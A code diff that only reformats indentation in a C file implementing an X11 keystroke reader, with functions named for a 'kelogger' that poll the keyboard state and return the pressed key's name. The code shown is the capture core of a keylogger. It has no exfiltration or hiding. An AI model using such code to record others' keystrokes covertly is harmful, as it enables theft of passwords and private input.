@@ -13,22 +13,22 @@ static Display* __display = NULL;
 
 unsigned int __init_kelogger (const char* denv)
 {
-	ReturnNotNull(__display);
+  ReturnNotNull(__display);
   XInitThreads();
   __display = XOpenDisplay(denv);
   ReturnNull(__display);
-	return 1;
+  return 1;
 }
 
 unsigned int __destroy_kelogger ()
 {
-	ReturnNull(__display);
-	return XCloseDisplay(__display) == 0? 1: 0;
+  ReturnNull(__display);
+  return XCloseDisplay(__display) == 0? 1: 0;
 }
 
 char* __start_reading_input ()
 {
-	ReturnNull(__display);
+  ReturnNull(__display);
 
   char keys[32];
   KeySym keysym = -1;
@@ -46,9 +46,9 @@ char* __start_reading_input ()
         KeySym *tmp_keysym = XGetKeyboardMapping(__display, i * 8 + j, 1, &_);
         keysym = (*tmp_keysym);
         XFree(tmp_keysym);
-  		}
-  	}
+      }
+    }
   }
 
-	return XKeysymToString(keysym);
+  return XKeysymToString(keysym);
 }
